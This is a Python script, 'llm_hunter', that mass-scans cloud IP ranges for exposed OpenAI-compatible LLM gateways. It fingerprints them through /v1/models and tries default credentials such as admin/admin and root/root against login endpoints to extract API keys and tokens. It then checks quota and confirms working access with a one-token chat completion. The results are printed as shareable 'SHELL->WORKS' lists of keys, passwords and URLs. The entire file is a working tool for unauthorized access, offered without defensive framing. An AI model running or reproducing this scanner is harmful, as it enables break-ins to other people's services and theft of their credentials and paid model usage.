#!/usr/bin/env python3
"""llm_hunter — scan cloud IPs for exposed OpenAI-compatible LLM gateways.

Chain:
  1. Port scan (3000, 3001, 8000) via masscan or nmap
  2. Service fingerprint (/v1/models)
  3. Auth probe (/login, /api/auth)
  4. Quota check
  5. Validate (1-token chat completion)
  6. Output: SHELL->WORKS / SWEEP WORKS format

Usage:
  python llm_hunter.py --cidr 119.0.0.0/16,115.0.0.0/16 --ports 3000,3001,8000
  python llm_hunter.py --cidr 8.0.0.0/14 --ports 3000 --workers 200
  python llm_hunter.py --file ips.txt --ports 3000,3001
"""
import argparse, json, re, socket, ssl, sys, time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from pathlib import Path
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError

TIMEOUT = 5
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

@dataclass
class Finding:
    ip: str
    port: int
    base_url: str = ""
    model: str = ""
    api_key: str = ""
    user: str = ""
    password: str = ""
    quota: str = ""
    used: str = ""
    status: str = ""  # WORKS, REFUSED, DEAD, UNKNOWN
    detail: str = ""

def http_get(url, headers=None, timeout=TIMEOUT):
    try:
        req = Request(url, headers={"User-Agent": USER_AGENT, **(headers or {})})
        with urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", errors="replace")
    except (HTTPError, URLError, socket.timeout, ssl.SSLError, OSError) as e:
        return 0, str(e)

def http_post(url, data, headers=None, timeout=TIMEOUT):
    try:
        body = json.dumps(data).encode()
        req = Request(url, data=body, method="POST",
                      headers={"User-Agent": USER_AGENT, "Content-Type": "application/json", **(headers or {})})
        with urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", errors="replace")
    except (HTTPError, URLError, socket.timeout, ssl.SSLError, OSError) as e:
        return 0, str(e)

def port_open(ip, port, timeout=1.5):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        r = s.connect_ex((ip, port))
        s.close()
        return r == 0
    except Exception:
        return False

def fingerprint(ip, port):
    """Check if /v1/models returns JSON = OpenAI-compatible."""
    base = f"http://{ip}:{port}"
    status, body = http_get(f"{base}/v1/models")
    if status == 200:
        try:
            d = json.loads(body)
            models = [m.get("id", "") for m in d.get("data", [])]
            return base, models
        except (json.JSONDecodeError, KeyError):
            pass
    # try without /v1
    status2, body2 = http_get(f"{base}/models")
    if status2 == 200:
        try:
            d = json.loads(body2)
            models = [m.get("id", "") for m in d.get("data", [])]
            return base, models
        except (json.JSONDecodeError, KeyError):
            pass
    return base, []

def probe_auth(base, models):
    """Try common auth endpoints to find user/pass/key."""
    candidates = [
        f"{base}/login", f"{base}/api/login", f"{base}/api/auth/login",
        f"{base}/auth", f"{base}/api/v1/login",
    ]
    # Try unauth /v1/models first
    status, body = http_get(f"{base}/v1/models")
    if status == 200:
        return {"key": "", "user": "", "pass": "", "quota": "", "used": "", "unauth": True}

    # Try common default creds
    for user, pw in [("admin", "admin"), ("admin", "123456"), ("root", "root"),
                      ("admin", "password"), ("user", "user")]:
        for ep in candidates:
            s, b = http_post(ep, {"username": user, "password": pw})
            if s == 200:
                try:
                    d = json.loads(b)
                    key = d.get("key") or d.get("api_key") or d.get("token") or ""
                    quota = d.get("quota") or d.get("remaining") or ""
                    return {"key": key, "user": user, "pass": pw, "quota": str(quota), "used": "0", "unauth": False}
                except json.JSONDecodeError:
                    return {"key": "", "user": user, "pass": pw, "quota": "", "used": "", "unauth": False}
    return None

def check_quota(base, key):
    """Check quota/usage endpoints."""
    headers = {"Authorization": f"Bearer {key}"} if key else {}
    for ep in [f"{base}/v1/usage", f"{base}/api/usage", f"{base}/account", f"{base}/api/account"]:
        s, b = http_get(ep, headers)
        if s == 200:
            try:
                d = json.loads(b)
                quota = d.get("quota") or d.get("remaining_quota") or d.get("limit") or ""
                used = d.get("used") or d.get("used_quota") or "0"
                return str(quota), str(used)
            except json.JSONDecodeError:
                pass
    return "", ""

def validate(base, model, key):
    """Send 1-token chat completion to confirm the endpoint works."""
    headers = {"Content-Type": "application/json"}
    if key:
        headers["Authorization"] = f"Bearer {key}"
    payload = {
        "model": model or "gpt-4o-mini",
        "messages": [{"role": "user", "content": "hi"}],
        "max_tokens": 1,
    }
    s, b = http_post(f"{base}/v1/chat/completions", payload, headers)
    if s == 200:
        return True, "OK"
    if s == 401:
        return False, "401 auth"
    if s == 402:
        return False, "402 quota"
    if s == 403:
        return False, "403 forbidden"
    if s == 404:
        return False, "404 model"
    return False, f"HTTP {s}"

def scan_ip(ip, ports, workers=4):
    """Full chain for one IP."""
    results = []
    open_ports = []
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(port_open, ip, p): p for p in ports}
        for f in as_completed(futs):
            p = futs[f]
            if f.result():
                open_ports.append(p)
    if not open_ports:
        return results

    for port in sorted(open_ports):
        f = Finding(ip=ip, port=port)
        f.base_url, models = fingerprint(ip, port)
        if not models:
            f.status = "DEAD"
            f.detail = "not openai-compatible"
            results.append(f)
            continue
        f.model = models[0] if models else ""

        # auth probe
        auth = probe_auth(f.base_url, models)
        if auth:
            f.api_key = auth.get("key", "")
            f.user = auth.get("user", "")
            f.password = auth.get("pass", "")
            f.quota = auth.get("quota", "")
            f.used = auth.get("used", "")
        else:
            # maybe unauth access
            f.api_key = ""
            f.quota, f.used = check_quota(f.base_url, "")

        # validate
        ok, detail = validate(f.base_url, f.model, f.api_key)
        f.status = "WORKS" if ok else "REFUSED"
        f.detail = detail
        results.append(f)
    return results

def format_output(findings, label="SHELL->WORKS"):
    works = [f for f in findings if f.status == "WORKS"]
    ts = time.strftime("%d/%m %H:%M-%H:%M")
    lines = [f"🎯 {label} x{len(works)} — {ts}", ""]
    for i, f in enumerate(works, 1):
        lines.append(f"{i}️⃣ {f.ip}:{f.port} — {f.model}")
        if f.api_key:
            lines.append(f"Key: {f.api_key}")
        lines.append(f"Base: {f.base_url}/v1")
        if f.user:
            lines.append(f"User: {f.user} | Pass: {f.password}")
        q = f.quota if f.quota else "UNLIMITED"
        lines.append(f"Quota: {q} | Used: {f.used or '0'}")
        lines.append("")
    lines.append(f"Tanggal: {time.strftime('%d/%m/%Y')} | Jam: {time.strftime('%H:%M')} WIB")
    return "\n".join(lines)

def main():
    ap = argparse.ArgumentParser(description="LLM gateway hunter")
    ap.add_argument("--cidr", help="Comma-separated CIDRs to scan")
    ap.add_argument("--file", help="File with IPs (one per line)")
    ap.add_argument("--ports", default="3000,3001,8000", help="Comma-separated ports")
    ap.add_argument("--workers", type=int, default=50, help="Concurrent IP workers")
    ap.add_argument("--timeout", type=int, default=5, help="HTTP timeout")
    ap.add_argument("--output", default="hunt_results.txt", help="Output file")
    ap.add_argument("--label", default="SHELL->WORKS", help="Output label")
    a = ap.parse_args()

    ports = [int(p) for p in a.ports.split(",")]
    TIMEOUT = a.timeout

    # Collect IPs
    ips = []
    if a.cidr:
        import ipaddress
        for cidr in a.cidr.split(","):
            cidr = cidr.strip()
            for ip in ipaddress.ip_network(cidr):
                ips.append(str(ip))
    if a.file:
        for line in open(a.file):
            line = line.strip()
            if line and not line.startswith("#"):
                ips.append(line)

    if not ips:
        ap.error("Provide --cidr or --file")

    # Support ip:port lines (masscan -oL output) — use those ports too
    extra_ports = set()
    clean_ips = []
    for entry in ips:
        e = entry.strip()
        if ":" in e and e.count(":") == 1:
            host, _, port_s = e.partition(":")
            if host.count(".") == 3 and port_s.isdigit():
                clean_ips.append(host)
                extra_ports.add(int(port_s))
                continue
        clean_ips.append(e)
    ips = clean_ips
    if extra_ports:
        ports = sorted(set(ports) | extra_ports)
        print(f"[*] detected ip:port entries, ports -> {ports}", file=sys.stderr)

    print(f"[*] Scanning {len(ips)} IPs on ports {ports}", file=sys.stderr)
    print(f"[*] Workers: {a.workers}, timeout: {TIMEOUT}s", file=sys.stderr)

    findings = []
    done = 0
    with ThreadPoolExecutor(max_workers=a.workers) as ex:
        futs = {ex.submit(scan_ip, ip, ports): ip for ip in ips}
        for f in as_completed(futs):
            done += 1
            if done % 100 == 0:
                print(f"[*] {done}/{len(ips)} done, {len(findings)} findings", file=sys.stderr)
            try:
                findings.extend(f.result())
            except Exception as e:
                pass

    works = [f for f in findings if f.status == "WORKS"]
    print(f"\n[*] Total findings: {len(findings)}, WORKS: {len(works)}", file=sys.stderr)

    out = format_output(findings, a.label)
    Path(a.output).write_text(out)
    print(f"[*] Saved to {a.output}", file=sys.stderr)
    print(out)

if __name__ == "__main__":
    main()
